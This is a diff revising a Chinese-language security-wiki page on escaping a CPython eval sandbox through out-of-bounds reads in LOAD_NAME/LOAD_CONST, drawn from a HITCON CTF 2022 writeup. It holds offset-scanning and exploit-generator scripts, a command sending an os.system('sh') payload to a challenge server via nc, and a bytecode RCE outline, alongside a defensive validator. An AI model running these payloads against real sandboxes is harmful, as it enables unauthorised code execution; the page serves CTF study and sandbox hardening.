@@ -1,45 +1,43 @@
 # LOAD_NAME / LOAD_CONST opcode OOB Read
 
-{{#include ../../../banners/hacktricks-training.md}}
-
-**此信息取自** [**这篇 writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**。**<sup>[[1]](#references)</sup>
+本页面改编自 Splitline 对 HITCON CTF 2022 "V O I D" 的原始 writeup 和 exploit chain。<sup>[[1]](#references)</sup>
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-我们可以利用 LOAD_NAME / LOAD_CONST opcode 中的 OOB read 功能来获取内存中的某些 symbol。这意味着可以使用类似 `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` 的技巧来获取你想要的 symbol（例如函数名）。
+`LOAD_NAME` 或 `LOAD_CONST` 的操作数可以读取刻意缩短的 `co_names` 或 `co_consts` tuple 之外的数据。在此 challenge 中，会使用不可达的 dummy names，直到附近的条目包含 `__getattribute__` 等有用的 attribute。<sup>[[1]](#references)</sup>
 
-然后只需构造你的 exploit。
+剩余的 payload 会复用该恢复出的 name 来构建 sandbox escape。<sup>[[1]](#references)</sup>
 
-### Overview <a href="#overview-1" id="overview-1"></a>
+### 概述 <a href="#overview-1" id="overview-1"></a>
 
-源代码非常短，仅包含 4 行！
+该 challenge wrapper 很短，并会在 evaluate 之前编译一个 expression：<sup>[[1]](#references)</sup>
 ```python
 source = input('>>> ')
 if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
-print(eval(code, {'__builtins__': {}}))1234
+print(eval(code, {'__builtins__': {}}))
 ```
-你可以输入任意 Python code，并将其编译为一个 [Python code object](https://docs.python.org/3/c-api/code.html)。不过，在 eval 该 code object 之前，其中的 `co_consts` 和 `co_names` 会被替换为空 tuple。
+输入会被编译为 Python code object，然后 wrapper 会在调用 `eval` 前，将其 `co_consts` 和 `co_names` 替换为空 tuple。<sup>[[1]](#references)[[5]](#references)</sup>
 
-因此，所有包含 consts（例如数字、字符串等）或 names（例如变量、函数）的 expression，最终都可能导致 segmentation fault。
+任何仍会索引这些表的生成指令，都可能导致 interpreter 崩溃，或暴露相邻的 object pointer，具体取决于构建方式。<sup>[[1]](#references)</sup>
 
 ### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
-segmentation fault 是如何发生的？
+segfault 是如何发生的？
 
-让我们从一个简单的示例开始，`[a, b, c]` 可以被编译为以下 bytecode。
+对于 `[a, b, c]` 这样的 list expression，compiler 会生成操作数连续的 `LOAD_NAME` 指令：<sup>[[1]](#references)[[2]](#references)</sup>
 ```
 1           0 LOAD_NAME                0 (a)
 2 LOAD_NAME                1 (b)
 4 LOAD_NAME                2 (c)
 6 BUILD_LIST               3
-8 RETURN_VALUE12345
+8 RETURN_VALUE
 ```
-但是，如果 `co_names` 变成空 tuple，会发生什么？`LOAD_NAME 2` opcode 仍然会被执行，并尝试从它原本应在的内存地址读取值。没错，这是一个越界读取（out-of-bound read）“feature”。
+如果将 `co_names` 替换为 `()`，字节码仍然携带 `LOAD_NAME 2`；因此，未经检查的元组访问可能会获取元组之外的指针，而不是抛出 `IndexError`。<sup>[[1]](#references)[[3]](#references)</sup>
 
-该解决方案的核心概念很简单。CPython 中的一些 opcode，例如 `LOAD_NAME` 和 `LOAD_CONST`，容易受到 OOB read 的影响。
+`LOAD_NAME` 和 `LOAD_CONST` 是这里的核心原语：它们的整数操作数分别选择 `co_names` 和 `co_consts` 中的条目。<sup>[[1]](#references)[[2]](#references)</sup>
 
-它们会从 `consts` 或 `names` tuple 中读取索引为 `oparg` 的对象（这就是 `co_consts` 和 `co_names` 在底层的名称）。我们可以参考下面关于 `LOAD_CONST` 的简短代码片段，了解 CPython 在处理 `LOAD_CONST` opcode 时会做什么。
+在 CPython 的 dispatch 中，`LOAD_CONST` 获取选定的元组条目并将其压入栈中；release builds 使用未经检查的元组访问器：<sup>[[3]](#references)</sup>
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -47,23 +45,24 @@ PyObject *value = GETITEM(consts, oparg);
 Py_INCREF(value);
 PUSH(value);
 FAST_DISPATCH();
-}1234567
+}
 ```
-通过这种方式，我们可以利用 OOB feature 从任意内存偏移量获取一个“name”。为了确认它的名称及其偏移量，只需不断尝试 `LOAD_NAME 0`、`LOAD_NAME 1` ... `LOAD_NAME 99` ... 你可能会在 oparg > 700 的位置找到一些内容。当然，你也可以尝试使用 `gdb` 查看内存布局，但我不认为这样会更容易？
+在目标 interpreter 上探测不断增加的 `LOAD_NAME` 操作数，以映射有用的条目。Splitline 在 challenge 环境中观察到 700 以上的有用偏移量，但布局取决于具体 build；可以使用 debugger 检查周围的内存。<sup>[[1]](#references)</sup>
 
 ### 生成 Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-获取这些有用的 names / consts 偏移量后，我们要如何从该偏移量获取 name / const 并使用它呢？这里有一个技巧：\
-假设我们可以在偏移量 5（`LOAD_NAME 5`）处获取一个 `__getattribute__` name，并且 `co_names=()`，那么只需执行以下操作：
+一旦某个偏移量产生了有用的名称，就将越界查找放入不可达表达式中，并从可达的属性访问中引用同一个 `co_names` 槽位。<sup>[[1]](#references)</sup>
+
+例如，如果偏移量 5 产生 `__getattribute__`，则将该名称保留在槽位 5 中，同时让 false 分支执行有用的查找：<sup>[[1]](#references)</sup>
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
-]1234
+]
 ```
-> 注意，不必将其命名为 `__getattribute__`，你可以将其命名得更短或更奇怪一些
+> 恢复出的文本不一定要是 `__getattribute__`；任何能够为 payload 提供作用的标识符都可以占据该位置。<sup>[[1]](#references)</sup>
 
-只需查看它的 bytecode，就能理解其中的原因：
+正如反汇编所示，对于同一个名称的重复出现，编译器会重复使用 `co_names` 中的同一个槽位：<sup>[[1]](#references)[[2]](#references)</sup>
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -78,11 +77,11 @@ FAST_DISPATCH();
 20 BUILD_LIST               0
 >>   22 LOAD_ATTR                5 (__getattribute__)
 24 BUILD_LIST               1
-26 RETURN_VALUE1234567891011121314
+26 RETURN_VALUE
 ```
-注意，`LOAD_ATTR` 也会从 `co_names` 中获取名称。Python 会从相同的 offset 加载名称，因此第二个 `__getattribute__` 仍然从 offset=5 加载。利用这一特性，只要名称位于附近的内存中，我们就可以使用任意名称。
+由于 `LOAD_ATTR` 也会通过 `co_names` 解析其名称，因此可达分支可以复用该槽位；较新 CPython 版本中的打包操作数在下面的版本说明中有所描述。<sup>[[1]](#references)[[2]](#references)</sup>
 
-生成数字应该很简单：
+无需使用常量，即可通过布尔表达式构造小的非负整数：<sup>[[1]](#references)</sup>
 
 - 0: not \[\[]]
 - 1: not \[]
@@ -91,9 +90,9 @@ FAST_DISPATCH();
 
 ### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-由于长度限制，我没有使用 consts。
+原始 exploit 使用名称而非常量，以符合 challenge 的长度限制。<sup>[[1]](#references)</sup>
 
-首先，这是一个用于查找这些名称 offset 的脚本。
+此 helper 通过构造一个空的 `co_names` tuple 来扫描候选名称偏移量。<sup>[[1]](#references)</sup>
 ```python
 from types import CodeType
 from opcode import opmap
@@ -126,9 +125,9 @@ ret = eval(c, {'__builtins__': MockBuiltins()})
 if ret:
 print(f'{n}: {ret}')
 
-# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
+# for i in $(seq 0 10000); do python find.py $i ; done
 ```
-以下内容用于生成真正的 Python exploit。
+下面的 generator 将恢复的偏移量映射到名称，并生成源代码级别的 payload。<sup>[[1]](#references)</sup>
 ```python
 import sys
 import unicodedata
@@ -205,7 +204,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-它基本执行以下操作；对于这些字符串，我们通过 `__dir__` 方法获取：
+从高层次来看，生成的 payload 获取函数的 globals，恢复 `builtins`，并调用 `eval(input())`。<sup>[[1]](#references)</sup>
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -220,18 +219,19 @@ builtins['eval'](builtins['input']())
 ```
 ---
 
-### 版本说明和受影响的 opcodes（Python 3.11–3.13）
+### 版本说明和受影响的 opcode（Python 3.11–3.13）
 
-- CPython bytecode 仍然通过整数操作数索引 `co_consts` 和 `co_names` tuples。如果攻击者能够使这些 tuples 为空（或小于 bytecode 所使用的最大索引），解释器就会针对该索引读取越界内存，从附近内存中获取任意 PyObject 指针。相关 opcodes 至少包括：
-- `LOAD_CONST consti` → 读取 `co_consts[consti]`。
-- `LOAD_NAME namei`、`STORE_NAME`、`DELETE_NAME`、`LOAD_GLOBAL`、`STORE_GLOBAL`、`IMPORT_NAME`、`IMPORT_FROM`、`LOAD_ATTR`、`STORE_ATTR` → 从 `co_names[...]` 读取名称（对于 3.11+，注意 `LOAD_ATTR`/`LOAD_GLOBAL` 会在低位存储 flag bits；实际索引为 `namei >> 1`）。有关每个版本的确切语义，请参阅 disassembler docs。[Python dis docs].<sup>[[2]](#references)</sup>
-- Python 3.11+ 引入了 adaptive/inline caches，会在 instructions 之间添加隐藏的 `CACHE` entries。这不会改变 OOB primitive；但如果你手工构造 bytecode，在构建 `co_code` 时必须将这些 cache entries 计算在内。
+- 在 CPython 3.11–3.13 中，指令仍使用整数操作数来索引 code object 的 constant 和 name 表。如果任一元组短于被引用的索引，未经检查的访问可能会读取相邻的 object pointer，并导致崩溃或对其执行操作；具体行为取决于 interpreter build。<sup>[[2]](#references)[[3]](#references)</sup>
+- `LOAD_CONST consti` 和（3.12+）`RETURN_CONST consti` 会读取 `co_consts[consti]`。<sup>[[2]](#references)</sup>
+- 直接使用 name 表的指令包括 `LOAD_NAME`、`STORE_NAME`、`DELETE_NAME`、`STORE_GLOBAL`、`DELETE_GLOBAL`、`IMPORT_NAME`、`IMPORT_FROM`、`STORE_ATTR`、`DELETE_ATTR`，以及（3.12+）`LOAD_FROM_DICT_OR_GLOBALS`。<sup>[[2]](#references)</sup>
+- `LOAD_GLOBAL namei` 和 `LOAD_ATTR namei` 使用 `co_names[namei >> 1]`；低位 bit 控制文档所述的 NULL/method 行为。（3.12+）`LOAD_SUPER_ATTR namei` 使用 `co_names[namei >> 2]`，并将两个 flag 打包到其低位中。<sup>[[2]](#references)</sup>
+- Python 3.11+ 引入了 adaptive/inline cache，会在指令之间添加隐藏的 `CACHE` 条目。构建 `co_code` 时，手工编写的 bytecode 必须考虑这些条目。<sup>[[2]](#references)</sup>
 
-实际影响：当你能够控制 code object（例如通过 `CodeType.replace(...)`）并缩小 `co_consts`/`co_names` 时，此页面中的 technique 仍可在 CPython 3.11、3.12 和 3.13 上使用。
+实际影响是：bytecode 布局和恢复出的 offset 取决于具体 release 和 build。依赖该技术之前，请针对目标 CPython 版本测试该技术以及生成的 payload。<sup>[[2]](#references)</sup>
 
-### 用于查找有用 OOB indexes 的快速 scanner（兼容 3.11+/3.12+）
+### 用于查找有用 OOB index 的快速 scanner（兼容 3.11+/3.12+）
 
-如果你希望直接从 bytecode 中探测有趣的 objects，而不是从 high-level source 中探测，可以生成最小的 code objects 并对 indexes 进行 brute force。下面的 helper 会在需要时自动插入 inline caches。
+如果你更倾向于直接从 bytecode 中探测有价值的 object，而不是从 high-level source 中探测，可以生成最小的 code object 并对 index 进行 brute-force。下面的 helper 会根据目标 interpreter 的 `dis` metadata 插入 inline cache。<sup>[[2]](#references)</sup>
 ```python
 import dis, types
 
@@ -271,12 +271,12 @@ if obj is not None:
 print(idx, type(obj), repr(obj)[:80])
 ```
 注意事项
-- 如果要探测名称，请将 `LOAD_CONST` 替换为 `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR`，并相应调整栈的使用方式。
-- 如有需要，请使用 `EXTENDED_ARG` 或多个字节的 `arg` 来访问大于 255 的索引。像上面使用 `dis` 构建时，你只能控制低字节；对于更大的索引，请自行构造原始字节，或将攻击拆分到多个加载操作中。
+- 若要探测 names，请将 `LOAD_CONST` 替换为 `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR`，并根据目标 opcode 调整栈的使用方式和打包后的操作数。<sup>[[2]](#references)</sup>
+- 如有需要，可使用 `EXTENDED_ARG` 或多个字节的 `arg` 来访问大于 255 的索引。此 helper 仅生成操作数的低位字节，因此较大的索引需要直接构造原始字节或执行多次加载。<sup>[[2]](#references)</sup>
 
-### 仅字节码 RCE 模式（co_consts OOB → builtins → eval/input）
+### 仅使用 bytecode 的最小 RCE 模式（co_consts OOB → builtins → eval/input）
 
-确定某个 `co_consts` 索引可解析为 builtins module 后，即可通过操纵栈，在不使用任何 `co_names` 的情况下重建 `eval(input())`：
+确定某个 `co_consts` 索引可解析为 builtins module 后，即可通过操作栈，在不使用 `co_names` 的情况下重构 `eval(input())`。官方 B01lers CTF 2024 的 `awpcode` 材料记录了同样的 OOB-read 模式。<sup>[[4]](#references)</sup>
 ```python
 # Build co_code that:
 # 1) LOAD_CONST <builtins_idx> → push builtins module
@@ -285,31 +285,37 @@ print(idx, type(obj), repr(obj)[:80])
 # 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
 # This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
 ```
-这种方法适用于以下 challenges：它们允许你直接控制 `co_code`，同时强制设置 `co_consts=()` 和 `co_names=()`（例如 BCTF 2024 “awpcode”）。该方法无需依赖 source-level tricks，并通过利用 bytecode stack ops 和 tuple builders 来保持 payload size 较小。
+这种仅使用 stack 的方法适用于以下场景：challenge 让你直接控制 `co_code`，同时强制设置 `co_consts=()` 和 `co_names=()`；它避免了 source-level 技巧，并且可以通过使用 bytecode stack 操作和 tuple builders 来保持 payload 较小。<sup>[[4]](#references)</sup>
 
-### sandbox 的防御检查与缓解措施
+### 针对 sandbox 的防御性检查与缓解措施
 
-如果你正在编写一个用于编译/执行 untrusted code 或操作 code objects 的 Python “sandbox”，不要依赖 CPython 对 bytecode 使用的 tuple indexes 进行 bounds-check。相反，应在执行 code objects 之前自行进行验证。
+如果你正在编写一个用于编译或执行不受信任代码的 Python sandbox，请不要依赖 CPython 对 bytecode 使用的 tuple 索引执行边界检查。在执行代码对象之前验证它们。<sup>[[2]](#references)[[3]](#references)</sup>
 
-实用的 validator（拒绝对 co_consts/co_names 的 OOB access）
+实用的 validator（拒绝对 co_consts/co_names 的 OOB 访问）。<sup>[[2]](#references)</sup>
 ```python
 import dis
 
 def max_name_index(code):
 max_idx = -1
+direct_name_ops = {
+"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
+"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
+"LOAD_FROM_DICT_OR_GLOBALS",
+}
 for ins in dis.get_instructions(code):
-if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
-"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
+if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
 namei = ins.arg or 0
-# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
-if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
+# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
+if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
 namei >>= 1
+elif ins.opname == "LOAD_SUPER_ATTR":
+namei >>= 2
 max_idx = max(max_idx, namei)
 return max_idx
 
 def max_const_index(code):
 return max([ins.arg for ins in dis.get_instructions(code)
-if ins.opname == "LOAD_CONST"] + [-1])
+if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])
 
 def validate_code_object(code: type((lambda:0).__code__)):
 if max_const_index(code) >= len(code.co_consts):
@@ -323,13 +329,15 @@ raise ValueError("Bytecode refers to name index beyond co_names length")
 # validate_code_object(c)
 # eval(c, {'__builtins__': {}})
 ```
-补充的缓解措施
-- 不要允许在不可信输入上任意调用 `CodeType.replace(...)`，或者对生成的 code object 添加严格的结构检查。
-- 考虑使用带有 OS-level sandboxing（seccomp、job objects、containers）的独立进程运行不可信代码，而不是依赖 CPython semantics。
+其他缓解措施建议
+- 不要允许对不受信任的输入任意调用 `CodeType.replace(...)`，或对生成的 code object 添加严格的结构检查。
+- 考虑在独立进程中运行不受信任的代码，并使用 OS-level sandboxing（seccomp、job objects、containers），而不是依赖 CPython 语义。
 
 ## References
 
-- [1] [Splitline's HITCON CTF 2022 writeup "V O I D"（该技术及其 high-level exploit chain 的起源）](https://blog.splitline.tw/hitcon-ctf-2022/)
-- [2] [Python disassembler 文档（LOAD_CONST/LOAD_NAME/等指令的 indices semantics，以及 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` 的 low-bit flags）](https://docs.python.org/3.13/library/dis.html)
-
+- [1] [Splitline 的 HITCON CTF 2022 writeup “V O I D”（该技术及其高层 exploit chain 的来源）](https://blog.splitline.tw/hitcon-ctf-2022/)
+- [2] [Python 3.13 `dis` documentation（bytecode indices、packed name operands 和 inline caches）](https://docs.python.org/3.13/library/dis.html)
+- [3] [CPython 3.13.5 tuple-access macros（`GETITEM`）](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
+- [4] [B01lers CTF 2024 `awpcode` challenge writeup（CygnusX）](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
+- [5] [Python C API：Code Objects](https://docs.python.org/3/c-api/code.html)
 {{#include ../../../banners/hacktricks-training.md}}
